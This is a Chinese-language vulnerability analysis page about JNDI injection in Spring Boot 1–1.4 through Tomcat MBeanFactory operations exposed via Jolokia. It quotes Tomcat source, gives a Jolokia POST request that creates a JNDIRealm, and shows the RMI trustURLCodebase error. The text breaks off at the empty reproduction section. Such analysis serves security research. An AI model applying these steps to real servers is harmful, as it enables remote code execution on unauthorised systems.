<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.csFE4DF89B{text-align:left;margin:2pt 0pt 2pt 0pt;list-style-type:decimal;color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.csBF12A472{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:italic;}
			.cs82E15C94{text-align:left;margin:2pt 0pt 2pt -12pt;list-style-type:lower-latin;color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal}
			.csE3F655E4{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs5BEC2C28{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="spring-boot-tomcat导致的jndi注入"><span class="csDE05BCC">Spring Boot Tomcat</span><span class="csECDA2D3">导致的</span><span class="csDE05BCC">JNDI</span><span class="csECDA2D3">注入</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Spring Boot 1 - 1.4</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="漏洞分析"><span class="csD6CA00D2">漏洞分析</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs8926E06">spring Boot </span><span class="cs9C1B1871">内嵌了一个</span><span class="cs8926E06"> Tomcat</span><span class="cs9C1B1871">，所以在</span><span class="cs8926E06"> MBean </span><span class="cs9C1B1871">列表中列出了</span><span class="cs8926E06"> Tomcat </span><span class="cs9C1B1871">的</span><span class="cs8926E06"> MBean</span><span class="cs9C1B1871">。通过漫长的寻找（花了我两三天的晚上），找到了几个比较有意思的且感觉可以利用的</span><span class="cs8926E06"> MBean operation</span><span class="cs9C1B1871">。</span></p><ol start="1" style="margin-top:0;margin-bottom:0;">
			<li class="csFE4DF89B"><span class="cs8926E06">Tomcat:type=MBeanFactory createJNDIRealm -&gt; JNDI Injection</span></li><li class="csFE4DF89B"><span class="cs8926E06">Tomcat:type=MBeanFactory createJDBCRealm -&gt; JNDI Injection</span></li><li class="csFE4DF89B"><span class="cs8926E06">Tomcat:type=MBeanFactory createDataSourceRealm -&gt; JNDI Injection</span></li><li class="csFE4DF89B"><span class="cs8926E06">Tomcat:type=MBeanFactory createUserDatabaseRealm -&gt; JNDI Injection</span></li><li class="csFE4DF89B"><span class="cs8926E06">Tomcat:type=MBeanFactory createValve -&gt; Create Valve (File Writting, JNDI Injection)</span></li></ol>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">这里举一个</span><span class="cs8926E06"> createUserDatabaseRealm </span><span class="cs9C1B1871">的例子：</span></p><p class="cs3A447A38"><span class="cs9FB05234">&nbsp; FILE: tomcat-embed-core-8.5.15-sources.jar!\org\apache\catalina\mbeans\MBeanFactory.java</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;public String createUserDatabaseRealm(String parent, String resourceName)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;throws Exception {</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// Create a new UserDatabaseRealm instance</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;UserDatabaseRealm realm = new UserDatabaseRealm();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;realm.setResourceName(resourceName);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// Add the new instance to its parent component</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ObjectName pname = new ObjectName(parent);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Container container = getParentContainerFromParent(pname);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// Add the new instance to its parent component</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;container.setRealm(realm);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// Return the corresponding MBean name</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ObjectName oname = realm.getObjectName();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// FIXME getObjectName() returns null</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//ObjectName oname =</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// &nbsp;&nbsp;&nbsp;MBeanUtils.createObjectName(pname.getDomain(), realm);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (oname != null) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return (oname.toString());</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return null;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">调用</span><span class="cs8926E06"> setter </span><span class="cs9C1B1871">把</span><span class="cs8926E06"> resourceName </span><span class="cs9C1B1871">写入。接着在</span><span class="cs8926E06"> start Realm </span><span class="cs9C1B1871">的时候，会调用以下函数：</span></p><p class="cs40DD2BC9"><span class="cs8926E06">FILE: tomcat-embed-core\8.5.15-embed-core-8.5.15-sources.jar!.java</span></p><p class="cs3A447A38"><span class="cs9FB05234">&nbsp; &nbsp;@Override</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;protected void startInternal() throws LifecycleException {</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Context context = getServer().getGlobalNamingContext();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;database = (UserDatabase) context.lookup(resourceName);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} catch (Throwable e) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ExceptionUtils.handleThrowable(e);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;containerLog.error(sm.getString(&quot;userDatabaseRealm.lookup&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;resourceName),</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;e);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;database = null;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (database == null) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;throw new LifecycleException</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(sm.getString(&quot;userDatabaseRealm.noDatabase&quot;, resourceName));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;super.startInternal();</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">是不是非常熟悉的场景？</span><span class="cs9FB05234">context.lookup(resourceName)</span><span class="cs9C1B1871">，而</span><span class="cs8926E06"> resourceName </span><span class="cs9C1B1871">可控，那么可以直接</span><span class="cs8926E06">JNDI </span><span class="cs9C1B1871">注入了。但是遗憾的是</span><span class="cs9FB05234">getServer().getGlobalNamingContext()</span><span class="cs8926E06"> </span><span class="cs9C1B1871">返回的是</span><span class="cs8926E06"> null</span><span class="cs9C1B1871">，所以在</span><span class="cs8926E06">lookup</span><span class="cs9C1B1871">的时候抛了</span><span class="cs8926E06"> NullPointer </span><span class="cs9C1B1871">的错误。还有一些奇奇怪怪的</span><span class="cs8926E06"> Bug</span><span class="cs9C1B1871">，比如利用</span><span class="cs8926E06"> createValve </span><span class="cs9C1B1871">创建一个</span><span class="cs8926E06">JDBCAccessLogValve</span><span class="cs9C1B1871">，但是利用</span><span class="cs8926E06"> Jolokia </span><span class="cs9C1B1871">设置其</span><span class="cs8926E06"> driverName </span><span class="cs9C1B1871">的时候，由于</span><span class="cs8926E06"> driverName </span><span class="cs9C1B1871">没有</span><span class="cs8926E06">getter</span><span class="cs9C1B1871">，导致</span><span class="cs8926E06"> Jolokia </span><span class="cs9C1B1871">不能正常设置；再比如</span><span class="cs8926E06"> createJDBCRealm </span><span class="cs9C1B1871">的时候，由于这个方法接受的参数和</span><span class="cs8926E06">MBean </span><span class="cs9C1B1871">导出（</span><span class="cs8926E06">mbeans-descriptors.xml</span><span class="cs9C1B1871">）的配置文件内写的参数数量不一致导致无法调用这个</span><span class="cs8926E06"> MBean operation</span><span class="cs9C1B1871">。</span></p><h4 class="cs868C439D">
			<a name="createjndirealm"><span class="csBF12A472">createJNDIRealm</span></a></h4>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">在多次尝试后，最终我盯上了</span><span class="cs8926E06"> createJNDIRealm </span><span class="cs9C1B1871">这个方法。</span></p><p class="cs40DD2BC9"><span class="cs8926E06">FILE: tomcat-embed-core-8.5.15-sources.jar!.java</span></p><p class="cs3A447A38"><span class="cs9FB05234">public String createJNDIRealm(String parent)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;throws Exception {</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;// Create a new JNDIRealm instance</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;JNDIRealm realm = new JNDIRealm();</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// Add the new instance to its parent component</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;ObjectName pname = new ObjectName(parent);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;Container container = getParentContainerFromParent(pname);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// Add the new instance to its parent component</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;container.setRealm(realm);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// Return the corresponding MBean name</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;ObjectName oname = realm.getObjectName();</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if (oname != null) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return (oname.toString());</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return null;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这里只传入了</span><span class="cs8926E06"> parent</span><span class="cs9C1B1871">。利用</span><span class="cs8926E06"> Burpsuite </span><span class="cs9C1B1871">先创建这个</span><span class="cs8926E06"> Realm</span><span class="cs9C1B1871">。</span></p><p class="cs3A447A38"><span class="cs9FB05234">POST /jolokia/ HTTP/1.1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Host: localhost</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Type: application/json</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Length: 133</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;type&quot;: &quot;EXEC&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;mbean&quot;: &quot;Tomcat:type=MBeanFactory&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;operation&quot;: &quot;createJNDIRealm&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;arguments&quot;: [&quot;Tomcat:type=Engine&quot;]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">创建成功后，我们查看这个</span><span class="cs8926E06"> Realm </span><span class="cs9C1B1871">的</span><span class="cs8926E06"> MBean </span><span class="cs9C1B1871">信息：</span></p><p class="cs3A447A38"><span class="cs9FB05234">realmPath=/realm0,type=Realm: {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;op: {...},</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;attr: {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;userPassword: {},</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;connectionURL: {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rw: true,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;type: &quot;java.lang.String&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;desc: &quot;The connection URL for the server we will contact&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;},</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;roleNested: {},</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;userSearch: {},</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;connectionTimeout: {},</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;authentication: {},</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;contextFactory: {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rw: true,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;type: &quot;java.lang.String&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;desc: &quot;The JNDI context factory for this Realm&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;},</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;userPattern: {},</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;},</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;class: &quot;org.apache.tomcat.util.modeler.BaseModelMBean&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;desc: &quot;Implementation of Realm that works with a directory server a...&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">注意到两个有意思的属性，</span><span class="cs8926E06">connectionURL </span><span class="cs9C1B1871">和</span><span class="cs8926E06"> contextFactory</span><span class="cs9C1B1871">。查看</span><span class="cs8926E06"> JNDIRealm </span><span class="cs9C1B1871">的源码：</span></p><p class="cs3A447A38"><span class="cs9FB05234">FILE: </span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;protected Hashtable&lt;String, String&gt; getDirectoryContextEnvironment() {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Hashtable&lt;String, String&gt; env = new Hashtable();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (this.containerLog.isDebugEnabled() &amp;&amp; this.connectionAttempt == 0) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this.containerLog.debug(&quot;Connecting to URL &quot; + this.connectionURL);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else if (this.containerLog.isDebugEnabled() &amp;&amp; this.connectionAttempt &gt; 0) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this.containerLog.debug(&quot;Connecting to URL &quot; + this.alternateURL);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;env.put(&quot;java.naming.factory.initial&quot;, this.contextFactory);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if (this.connectionName != null) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;env.put(&quot;java.naming.security.principal&quot;, this.connectionName);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if (this.connectionPassword != null) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;env.put(&quot;java.naming.security.credentials&quot;, this.connectionPassword);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if (this.connectionURL != null &amp;&amp; this.connectionAttempt == 0) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;env.put(&quot;java.naming.provider.url&quot;, this.connectionURL);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;} else if (this.alternateURL != null &amp;&amp; this.connectionAttempt &gt; 0) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;env.put(&quot;java.naming.provider.url&quot;, this.alternateURL);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return env;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">private DirContext createDirContext(Hashtable&lt;String, String&gt; env) throws NamingException {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return (DirContext)(this.useStartTls ? this.createTlsDirContext(env) : new InitialDirContext(env));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">可见</span><span class="cs8926E06"> java.naming.factory.initial </span><span class="cs9C1B1871">和</span><span class="cs8926E06"> java.naming.provider.url </span><span class="cs9C1B1871">我们都可以通过</span><span class="cs8926E06"> MBean </span><span class="cs9C1B1871">来进行修改，接着在</span><span class="cs8926E06"> createDirContext </span><span class="cs9C1B1871">方法，利用刚才的</span><span class="cs8926E06"> env </span><span class="cs9C1B1871">创建了</span><span class="cs8926E06"> InitialDirContext </span><span class="cs9C1B1871">对象。最终可以造成</span><span class="cs8926E06">JNDI </span><span class="cs9C1B1871">注入。于是我满怀欣喜的搭建好</span><span class="cs8926E06"> RMI Service</span><span class="cs9C1B1871">，却发现爆了这么一个错误：</span></p><p class="cs3A447A38"><span class="cs9FB05234">javax.naming.ConfigurationException: The object factory is untrusted. Set the system property &#39;com.sun.jndi.rmi.object.trustURLCodebase&#39; to &#39;true&#39;.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;at com.sun.jndi.rmi.registry.RegistryContext.decodeObject(RegistryContext.java:495) ~[na:1.8.0_121]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;at com.sun.jndi.rmi.registry.RegistryContext.lookup(RegistryContext.java:138) ~[na:1.8.0_121]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:205) ~[na:1.8.0_121]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;at com.sun.jndi.url.rmi.rmiURLContextFactory.getUsingURL(rmiURLContextFactory.java:71) ~[na:1.8.0_121]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;at com.sun.jndi.url.rmi.rmiURLContextFactory.getObjectInstance(rmiURLContextFactory.java:56) ~[na:1.8.0_121]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;at com.sun.jndi.rmi.registry.RegistryContextFactory.URLToContext(RegistryContextFactory.java:102) ~[na:1.8.0_121]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;at com.sun.jndi.rmi.registry.RegistryContextFactory.getInitialContext(RegistryContextFactory.java:69) ~[na:1.8.0_121]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;...</span></p><h3 class="cs868C439D">
			<a name="漏洞复现"><span class="csD6CA00D2">漏洞复现</span></a></h3>
